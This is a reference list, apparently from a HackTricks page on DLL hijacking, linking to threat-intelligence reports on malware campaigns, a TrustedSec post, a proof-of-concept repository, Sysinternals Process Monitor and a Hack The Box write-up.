- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
